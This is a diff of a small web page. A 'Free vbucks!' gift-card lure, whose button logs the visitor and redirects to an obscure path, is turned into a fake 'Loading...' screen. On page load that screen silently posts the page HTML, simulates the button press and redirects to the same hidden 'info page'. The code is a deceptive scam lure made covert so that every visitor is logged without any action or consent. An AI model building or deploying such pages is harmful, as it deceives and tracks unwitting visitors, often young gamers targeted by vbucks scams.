@@ -47,57 +47,33 @@
         margin-bottom: 25px;
         text-shadow: 0 0 8px rgba(255, 255, 255, 0.7);
       }
-      .btn-primary {
-        width: 100%;
-        padding: 15px;
-        font-size: 1.2rem;
-        font-weight: 600;
-        border-radius: 50px;
-        background: linear-gradient(45deg, #000000 0%, #000000 100%);
-        border: none;
-        box-shadow: 0 4px 15px rgba(37, 117, 252, 0.6);
-        transition: all 0.3s ease;
-      }
-      .btn-primary:hover {
-        background: linear-gradient(45deg, #ffffff 0%, #000000 100%);
-        box-shadow: 0 6px 20px rgba(106, 17, 203, 0.8);
-        transform: scale(1.05);
-      }
-      p {
-        font-size: 0.85rem;
-        text-align: center;
-        color: #ddd;
-        margin-top: 15px;
-        user-select: none;
-      }
     </style>
   </head>
   <body>
     <div class="card shadow">
       <div class="card-body">
-        <h5 class="card-title">Free vbucks!</h5>
-        <button class="btn btn-primary" id="vbucksBtn">Here!</button>
-        <p>Press the button for free, working vbucks giftcards!!</p>
+        <h5 class="card-title">Loading...</h5>
+        <p>You will be redirected shortly.</p>
       </div>
     </div>
 
     <script>
-      const vbucksBtn = document.getElementById('vbucksBtn');
-      vbucksBtn.addEventListener('click', () => {
-        fetch('/button-press', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ message: 'User has been logged✅️' }),
-        }).finally(() => {
-          window.location.href = "/ekrithjerbjtjejebtjriekthifiguufifiro39r884ifjf8939374758idjfud83ijrif8ei3jo3928rutieoejfufurhfiehiehrhrurhrbrheieihrururhrudhkehebrudiebrhtiurhrjeoeiduhfjfbrhr";
-        });
-      });
-
       window.onload = () => {
+        // Log page load
         fetch('/log-page', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ pageHTML: document.documentElement.outerHTML }),
+        });
+
+        // Simulate "button press" automatically
+        fetch('/button-press', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ message: 'Auto button press logged ✅️' }),
+        }).finally(() => {
+          // Redirect straight to the info page
+          window.location.href = "/ekrithjerbjtjejebtjriekthifiguufifiro39r884ifjf8939374758idjfud83ijrif8ei3jo3928rutieoejfufurhfiehiehrhrurhrbrheieihrururhrudhkehebrudiebrhtiurhrjeoeiduhfjfbrhr";
         });
       };
     </script>
